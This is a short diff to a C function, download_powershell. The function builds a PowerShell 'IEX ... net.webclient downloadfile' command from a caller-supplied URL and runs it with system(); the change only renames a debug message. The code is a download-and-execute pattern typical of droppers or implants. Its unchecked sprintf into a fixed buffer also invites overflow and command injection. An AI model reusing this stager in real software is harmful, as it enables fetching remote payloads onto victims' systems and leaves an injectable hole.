@@ -22,7 +22,7 @@ unsigned char* download_powershell(char *arg1, int *data_size) {
 	char download[500];  //how not to do it...
 	sprintf(download,"powershell.exe \"IEX ((new-object net.webclient).downloadfile('%s','%s'))\"", arg1, sh_filename);
 	
-	DEBUG_PRINT("url: %s\n", download);
+	DEBUG_PRINT("command: %s\n", download);
 	system(download);
 	DEBUG_PRINT("Download done.\n");
 		
